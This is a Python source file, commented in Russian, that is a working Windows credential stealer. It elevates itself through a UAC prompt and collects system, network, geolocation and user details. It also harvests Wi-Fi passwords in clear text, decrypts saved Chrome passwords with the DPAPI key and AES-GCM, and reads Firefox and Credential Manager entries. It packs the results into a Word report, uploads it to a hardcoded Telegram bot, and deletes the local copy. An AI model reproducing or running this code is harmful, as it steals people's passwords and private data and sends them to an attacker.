import platform
import socket
import uuid
import psutil
import wmi
import datetime
import requests
import getpass
import os
import subprocess
from winreg import ConnectRegistry, OpenKey, HKEY_LOCAL_MACHINE, QueryValueEx, EnumKey, CloseKey
import win32net
import ctypes
from docx import Document
import pandas as pd
import sys
import time
import sqlite3
import win32crypt
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import json

# Telegram API данные
CHAT_ID = "-4619435951"
BOT_TOKEN = "6871167004:AAG63-lwqImzNoWPP8Siq6ZFRSfC5GxF-vk"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

# Функция для проверки прав администратора
def is_admin():
    try:
        subprocess.check_output("net session", stderr=subprocess.STDOUT, shell=True)
        print("Admin rights confirmed via 'net session'.")
        return True
    except subprocess.CalledProcessError as e:
        print("Admin rights check failed via 'net session': Likely not running as admin.")
        return False
    except Exception as e:
        print(f"Admin rights check failed: {e}")
        return False

# Функция для перезапуска с правами администратора
def restart_as_admin():
    if getattr(sys, 'frozen', False):
        script_path = sys.executable
    else:
        script_path = os.path.abspath(sys.argv[0])
    try:
        print(f"Attempting to restart script with admin rights: {script_path}")
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script_path}"', None, 1)
        if result <= 32:
            print(f"Failed to restart with admin rights. ShellExecuteW returned: {result}")
            return False
        print("UAC prompt should appear. Waiting for user confirmation...")
        time.sleep(2)
        sys.exit(0)
    except Exception as e:
        print(f"Failed to restart as admin: {e}")
        return False

# Функция для получения температуры процессора
def get_cpu_temperature():
    try:
        w = wmi.WMI(namespace="root\\OpenHardwareMonitor")
        sensors = w.Sensor()
        for sensor in sensors:
            if sensor.SensorType == "Temperature" and "CPU" in sensor.Name:
                return f"{sensor.Value}°C"
        return "Not detected"
    except:
        return "Failed to retrieve"

# Функция для получения информации о видеокарте
def get_gpu_info():
    try:
        w = wmi.WMI()
        gpus = w.Win32_VideoController()
        if gpus:
            gpu_list = []
            for gpu in gpus:
                memory = "Not available"
                if gpu.AdapterRAM is not None:
                    try:
                        memory = f"{gpu.AdapterRAM // (1024 ** 2)} MB"
                    except Exception as e:
                        print(f"Error calculating GPU memory for {gpu.Name}: {e}")
                gpu_list.append(f"Name: {gpu.Name}, Memory: {memory}")
            print(f"Detected GPUs: {gpu_list}")
            return gpu_list
        print("No GPUs detected by Win32_VideoController.")
        return ["None found"]
    except Exception as e:
        print(f"Failed to retrieve GPU info: {e}")
        return [f"Failed to retrieve (error: {e})"]

# Функция для получения информации о Wi-Fi
def get_wifi_info():
    try:
        if not is_admin():
            return {"Wi-Fi Info": "Failed to retrieve: Admin rights required to access Wi-Fi information."}

        output = subprocess.check_output(["netsh", "wlan", "show", "interfaces"]).decode("utf-8", errors="ignore")
        ssid = None
        for line in output.split("\n"):
            if "SSID" in line and "BSSID" not in line:
                ssid = line.split(":")[1].strip()
                break
        
        wifi_info = {}
        wifi_info["Current Wi-Fi SSID"] = ssid if ssid else "Not connected"
        
        if ssid:
            try:
                print(f"Attempting to retrieve Wi-Fi password for SSID: {ssid}")
                profiles_output = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8", errors="ignore")
                if ssid not in profiles_output:
                    wifi_info["Wi-Fi Password"] = f"Profile for SSID '{ssid}' not found in system."
                else:
                    password_output = subprocess.check_output(["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"]).decode("utf-8", errors="ignore")
                    print(f"Raw output from netsh for SSID {ssid}:\n{password_output}")
                    password_found = False
                    key_content_labels = ["Key Content", "Содержимое ключа"]
                    for line in password_output.split("\n"):
                        for label in key_content_labels:
                            if label in line:
                                wifi_info["Wi-Fi Password"] = line.split(":")[1].strip()
                                password_found = True
                                break
                        if password_found:
                            break
                    if not password_found:
                        wifi_info["Wi-Fi Password"] = "Failed to retrieve (no key content found in netsh output)"
            except subprocess.CalledProcessError as e:
                wifi_info["Wi-Fi Password"] = f"Failed to retrieve (error: {e.output.decode('utf-8', errors='ignore')})"
            except Exception as e:
                wifi_info["Wi-Fi Password"] = f"Failed to retrieve (error: {e})"
        else:
            wifi_info["Wi-Fi Password"] = "N/A"

        try:
            profiles_output = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8", errors="ignore")
            profiles = [line.split(":")[1].strip() for line in profiles_output.split("\n") if "All User Profile" in line]
            wifi_info["Known Wi-Fi Networks"] = profiles if profiles else ["None found"]
        except Exception as e:
            wifi_info["Known Wi-Fi Networks"] = [f"Failed to retrieve: {e}"]

        return wifi_info
    except Exception as e:
        return {"Wi-Fi Info": [f"Failed to retrieve: {e}"]}

# Функция для получения информации о BIOS
def get_bios_info():
    try:
        w = wmi.WMI()
        bios = w.Win32_BIOS()[0]
        return [
            f"Manufacturer: {bios.Manufacturer}",
            f"Name: {bios.Name}",
            f"Version: {bios.Version}",
            f"Serial Number: {bios.SerialNumber}",
            f"Release Date: {bios.ReleaseDate[:4]}-{bios.ReleaseDate[4:6]}-{bios.ReleaseDate[6:8]}"
        ]
    except Exception as e:
        print(f"Failed to retrieve BIOS info: {e}")
        return [f"Failed to retrieve (error: {e})"]

# Функция для получения информации о материнской плате
def get_motherboard_info():
    try:
        w = wmi.WMI()
        motherboard = w.Win32_BaseBoard()[0]
        return [
            f"Manufacturer: {motherboard.Manufacturer}",
            f"Product: {motherboard.Product}",
            f"Serial Number: {motherboard.SerialNumber}"
        ]
    except Exception as e:
        print(f"Failed to retrieve motherboard info: {e}")
        return [f"Failed to retrieve (error: {e})"]

# Функция для получения расширенной информации о процессоре
def get_cpu_detailed_info():
    try:
        w = wmi.WMI()
        cpus = w.Win32_Processor()
        cpu_info = []
        for cpu in cpus:
            cpu_info.extend([
                f"Name: {cpu.Name}",
                f"Number of Cores: {cpu.NumberOfCores}",
                f"Max Clock Speed: {cpu.MaxClockSpeed} MHz",
                f"Current Clock Speed: {cpu.CurrentClockSpeed} MHz",
                f"Socket Designation: {cpu.SocketDesignation}"
            ])
        return cpu_info if cpu_info else ["None found"]
    except Exception as e:
        print(f"Failed to retrieve CPU detailed info: {e}")
        return [f"Failed to retrieve (error: {e})"]

# Функция для получения списка служб Windows
def get_services():
    services = []
    for service in psutil.win_service_iter():
        try:
            services.append(f"Name: {service.name()}, Status: {service.status()}")
        except:
            continue
    return services if services else ["None found"]

# Функция для получения списка драйверов
def get_drivers():
    try:
        w = wmi.WMI()
        drivers = []
        for driver in w.Win32_SystemDriver():
            drivers.append(f"Name: {driver.Name}, State: {driver.State}")
        return drivers if drivers else ["None found"]
    except:
        return ["Failed to retrieve"]

# Функция для получения списка USB-устройств
def get_usb_devices():
    try:
        w = wmi.WMI()
        devices = []
        for usb in w.Win32_USBHub():
            devices.append(f"Name: {usb.Description}")
        return devices if devices else ["None found"]
    except:
        return ["Failed to retrieve"]

# Функция для получения списка установленных программ
def get_installed_programs():
    programs = []
    try:
        reg = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        try:
            key = OpenKey(reg, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall")
            i = 0
            while True:
                try:
                    subkey_name = EnumKey(key, i)
                    subkey = OpenKey(key, subkey_name)
                    try:
                        name = QueryValueEx(subkey, "DisplayName")[0]
                        if name:
                            programs.append(f"Program: {name}")
                    except FileNotFoundError:
                        pass
                    finally:
                        CloseKey(subkey)
                    i += 1
                except OSError:
                    break
            CloseKey(key)

            if platform.machine().endswith('64'):
                try:
                    key_32 = OpenKey(reg, r"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall")
                    i = 0
                    while True:
                        try:
                            subkey_name = EnumKey(key_32, i)
                            subkey = OpenKey(key_32, subkey_name)
                            try:
                                name = QueryValueEx(subkey, "DisplayName")[0]
                                if name:
                                    programs.append(f"Program: {name}")
                            except FileNotFoundError:
                                pass
                            finally:
                                CloseKey(subkey)
                            i += 1
                        except OSError:
                            break
                    CloseKey(key_32)
                except Exception as e:
                    print(f"Failed to access WOW6432Node: {e}")
        finally:
            CloseKey(reg)
    except Exception as e:
        print(f"Failed to access registry for installed programs: {e}")
    return programs if programs else ["None found"]

# Функция для получения геолокации по IP
def get_geolocation():
    try:
        response = requests.get("http://ip-api.com/json/", timeout=10)
        data = response.json()
        if data["status"] == "success":
            return {
                "Country": data["country"],
                "Region": data["regionName"],
                "City": data["city"],
                "ISP": data["isp"],
                "Lat/Lon": f"{data['lat']}, {data['lon']}"
            }
    except:
        pass

    try:
        response = requests.get("https://ipinfo.io/json", timeout=10)
        data = response.json()
        return {
            "Country": data.get("country", "Unknown"),
            "Region": data.get("region", "Unknown"),
            "City": data.get("city", "Unknown"),
            "ISP": data.get("org", "Unknown"),
            "Lat/Lon": data.get("loc", "Unknown")
        }
    except:
        pass

    return {"Geolocation": ["Failed to retrieve"]}

# Функция для получения переменных окружения
def get_environment_vars():
    env_vars = [
        f"PATH: {os.environ.get('PATH', 'Not found')}",
        f"USERNAME: {os.environ.get('USERNAME', 'Not found')}",
        f"USERPROFILE: {os.environ.get('USERPROFILE', 'Not found')}"
    ]
    return env_vars

# Функция для получения списка локальных пользователей
def get_local_users():
    try:
        users = win32net.NetUserEnum(None, 1, 0)[0]
        return [f"User: {user['name']}" for user in users] if users else ["None found"]
    except:
        return ["Failed to retrieve users"]

# Функция для получения списка локальных групп
def get_local_groups():
    try:
        groups = win32net.NetLocalGroupEnum(None, 0)[0]
        return [f"Group: {group['name']}" for group in groups] if groups else ["None found"]
    except:
        return ["Failed to retrieve groups"]

# Функция для получения ключа шифрования Chrome
def get_chrome_encryption_key():
    """Получение ключа шифрования из файла Local State."""
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    if not os.path.exists(local_state_path):
        return None
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    
    # Ключ находится в поле os_crypt.encrypted_key
    encrypted_key = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key)
    
    # Удаляем префикс "DPAPI" (первые 5 байт)
    encrypted_key = encrypted_key[5:]
    
    # Расшифровываем ключ с помощью DPAPI
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

# Функция для расшифровки паролей Chrome
def decrypt_chrome_password(encrypted_password, key):
    """Расшифровка пароля Chrome с использованием AES-256-GCM."""
    try:
        # Проверяем, использует ли пароль новый формат (AES-GCM, v10 или v11)
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            # Извлекаем компоненты
            nonce = encrypted_password[3:15]  # 12 байт nonce
            ciphertext = encrypted_password[15:-16]  # Зашифрованные данные
            tag = encrypted_password[-16:]  # 16 байт тега аутентификации

            # Создаём шифр с использованием AES-GCM
            cipher = Cipher(
                algorithms.AES(key),
                modes.GCM(nonce, tag),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            decrypted_password = decryptor.update(ciphertext) + decryptor.finalize()
            return decrypted_password.decode("utf-8")
        else:
            # Старый формат (до Chrome 80) использует DPAPI
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode("utf-8")
    except Exception as e:
        return f"Failed to decrypt (error: {e})"

# Функция для получения паролей из Chrome
def get_chrome_passwords():
    """Получение паролей из Chrome."""
    try:
        # Путь к базе данных Chrome
        chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(chrome_path):
            return ["Chrome passwords: Not found (database missing)"]
        
        # Копируем файл, чтобы не блокировать оригинал
        temp_path = "LoginData_temp"
        shutil.copyfile(chrome_path, temp_path)
        
        # Получаем ключ шифрования
        key = get_chrome_encryption_key()
        if not key:
            return ["Chrome passwords: Failed to retrieve encryption key"]
        
        # Подключаемся к базе данных
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        passwords = []
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            if not url or not username or not encrypted_password:
                continue
            
            # Расшифровка пароля
            password = decrypt_chrome_password(encrypted_password, key)
            passwords.append(f"URL: {url}, Username: {username}, Password: {password}")
        
        conn.close()
        os.remove(temp_path)
        return passwords if passwords else ["Chrome passwords: None found"]
    except Exception as e:
        return [f"Chrome passwords: Failed to retrieve (error: {e})"]

# Функция для получения паролей из Firefox
def get_firefox_passwords():
    try:
        # Путь к профилю Firefox
        firefox_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(firefox_path):
            return ["Firefox passwords: Not found (profile missing)"]
        
        profiles = [d for d in os.listdir(firefox_path) if os.path.isdir(os.path.join(firefox_path, d))]
        if not profiles:
            return ["Firefox passwords: No profiles found"]
        
        passwords = []
        for profile in profiles:
            profile_path = os.path.join(firefox_path, profile)
            logins_file = os.path.join(profile_path, "logins.json")
            if not os.path.exists(logins_file):
                continue
            
            with open(logins_file, 'r') as f:
                data = json.load(f)
                for login in data.get("logins", []):
                    url = login.get("hostname", "Unknown")
                    username = login.get("encryptedUsername", "")
                    password = login.get("encryptedPassword", "")
                    try:
                        # Firefox использует шифрование NSS, для расшифровки нужен доступ к ключам
                        passwords.append(f"URL: {url}, Username: {username} (encrypted), Password: {password} (encrypted)")
                    except:
                        passwords.append(f"URL: {url}, Username: {username}, Password: Failed to decrypt")
        
        return passwords if passwords else ["Firefox passwords: None found"]
    except Exception as e:
        return [f"Firefox passwords: Failed to retrieve (error: {e})"]

# Функция для получения паролей из Windows Credential Manager
def get_credential_manager_passwords():
    try:
        # Используем команду 'cmdkey' для получения списка сохранённых учётных данных
        output = subprocess.check_output("cmdkey /list", shell=True).decode("utf-8", errors="ignore")
        credentials = []
        current_target = None
        for line in output.split("\n"):
            line = line.strip()
            if "Target:" in line:
                current_target = line.split("Target:")[1].strip()
            elif "User:" in line and current_target:
                username = line.split("User:")[1].strip()
                credentials.append(f"Target: {current_target}, Username: {username}, Password: Not accessible via cmdkey")
        
        return credentials if credentials else ["Credential Manager: None found"]
    except Exception as e:
        return [f"Credential Manager: Failed to retrieve (error: {e})"]

# Функция для сбора всей информации
def collect_all_info():
    info = {
        "System Info": {
            "Computer Name": platform.node(),
            "Username": getpass.getuser(),
            "OS": platform.platform(),
            "OS Version": f"{platform.win32_ver()[0]} {platform.win32_ver()[1]}",
            "Architecture": platform.machine(),
            "Processor": platform.processor(),
            "Python Version": platform.python_version(),
            "System Language": platform.win32_ver()[2],
            "Boot Time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%d/%m/%Y %H:%M:%S")
        },
        "CPU Info": get_cpu_detailed_info(),
        "GPU Info": get_gpu_info(),
        "Network Info": {
            "Local IP": socket.gethostbyname(socket.gethostname()),
            "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1]),
            "Hostname": socket.gethostname()
        },
        "Geolocation": get_geolocation(),
        "Wi-Fi Info": get_wifi_info(),
        "Hardware Info": {
            "Total Memory (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2),
            "Available Memory (GB)": round(psutil.virtual_memory().available / (1024 ** 3), 2),
            "Disk Usage": [f"{disk.device}: Total: {round(psutil.disk_usage(disk.mountpoint).total / (1024 ** 3), 2)} GB, Free: {round(psutil.disk_usage(disk.mountpoint).free / (1024 ** 3), 2)} GB" for disk in psutil.disk_partitions(all=False)]
        },
        "Battery Info": ["Percent: " + (f"{psutil.sensors_battery().percent}%" if psutil.sensors_battery() else "Not detected"),
                        "Plugged: " + ("Yes" if psutil.sensors_battery() and psutil.sensors_battery().power_plugged else "No" if psutil.sensors_battery() else "N/A"),
                        "Time Left: " + (f"{psutil.sensors_battery().secsleft // 3600}h {(psutil.sensors_battery().secsleft % 3600) // 60}m" if psutil.sensors_battery() and psutil.sensors_battery().secsleft != psutil.POWER_TIME_UNLIMITED else "Unlimited" if psutil.sensors_battery() else "N/A")] if psutil.sensors_battery() else ["Battery: Not detected"],
        "Screen Resolution": f"{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}",
        "BIOS Info": get_bios_info(),
        "Motherboard Info": get_motherboard_info(),
        "Installed Programs": get_installed_programs(),
        "Services": get_services(),
        "Drivers": get_drivers(),
        "USB Devices": get_usb_devices(),
        "Environment Variables": get_environment_vars(),
        "Local Users": get_local_users(),
        "Local Groups": get_local_groups(),
        "Saved Passwords": {
            "Chrome Passwords": get_chrome_passwords(),
            "Firefox Passwords": get_firefox_passwords(),
            "Credential Manager": get_credential_manager_passwords()
        },
        "DateTime": datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    }
    return info

# Функция для создания Word-файла с улучшенным форматированием
def create_word_file(info, filename):
    doc = Document()
    doc.add_heading("User Data Report", 0)
    for section, data in info.items():
        doc.add_heading(section, level=1)
        if isinstance(data, dict):
            for key, value in data.items():
                if isinstance(value, dict):
                    doc.add_paragraph(f"{key}:")
                    for sub_key, sub_value in value.items():
                        if isinstance(sub_value, list):
                            doc.add_paragraph(f"  {sub_key}:")
                            for item in sub_value:
                                doc.add_paragraph(f"    {item}", style='List Bullet')
                        else:
                            doc.add_paragraph(f"  {sub_key}: {sub_value}", style='List Bullet')
                        doc.add_paragraph("")  # Пустая строка для разделения
                elif isinstance(value, list):
                    doc.add_paragraph(f"{key}:")
                    for item in value:
                        doc.add_paragraph(f"  {item}", style='List Bullet')
                        doc.add_paragraph("")  # Пустая строка для разделения
                else:
                    doc.add_paragraph(f"{key}: {value}", style='List Bullet')
                    doc.add_paragraph("")  # Пустая строка для разделения
        elif isinstance(data, list):
            for item in data:
                doc.add_paragraph(item, style='List Bullet')
                doc.add_paragraph("")  # Пустая строка для разделения
        else:
            doc.add_paragraph(f"{section}: {data}", style='List Bullet')
            doc.add_paragraph("")  # Пустая строка для разделения
    doc.save(filename)
    return filename

# Функция для создания Excel-файла
def create_excel_file(info, filename):
    data = {}
    for section, section_data in info.items():
        if isinstance(section_data, dict):
            for key, value in section_data.items():
                if isinstance(value, dict):
                    for sub_key, sub_value in value.items():
                        data[f"{section} - {key} - {sub_key}"] = sub_value
                else:
                    data[f"{section} - {key}"] = value
        elif isinstance(section_data, list):
            for idx, item in enumerate(section_data):
                data[f"{section} - Item {idx + 1}"] = item
        else:
            data[section] = section_data
    df = pd.DataFrame([data])
    df.to_excel(filename, index=False, engine='openpyxl')
    return filename

# Функция для отправки файла в Telegram
def send_file_to_telegram(file_path):
    with open(file_path, 'rb') as file:
        files = {'document': file}
        payload = {'chat_id': CHAT_ID}
        try:
            response = requests.post(TELEGRAM_API_URL, data=payload, files=files, timeout=10)
            if response.status_code == 200:
                print("File sent successfully!")
            else:
                print(f"Failed to send file. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending file: {e}")

# Главная функция
if __name__ == "__main__":
    if not is_admin():
        print("Script is not running with admin rights. Restarting with admin rights...")
        if not restart_as_admin():
            print("Automatic restart failed. Please run the script manually with admin rights.")
            print("Steps to run as admin:")
            print("1. Right-click the script file.")
            print("2. Select 'Run as administrator'.")
            sys.exit(1)

    user_info = collect_all_info()
    username = getpass.getuser()
    computer_name = platform.node()
    file_format = "word"  # или "excel"
    filename = f"{username}_{computer_name}.{file_format}" if file_format == "word" else f"{username}_{computer_name}.{file_format}"

    file_pathAPPDATA = os.path.join(os.environ["APPDATA"], filename)

    if file_format == "word":
        file_path = create_word_file(user_info, file_pathAPPDATA)
    elif file_format == "excel":
        file_path = create_excel_file(user_info, file_pathAPPDATA)
    else:
        raise ValueError("Unsupported file format. Use 'word' or 'excel'.")

    send_file_to_telegram(file_path)
    os.remove(file_path)
    print(f"File {file_path} has been sent and deleted.")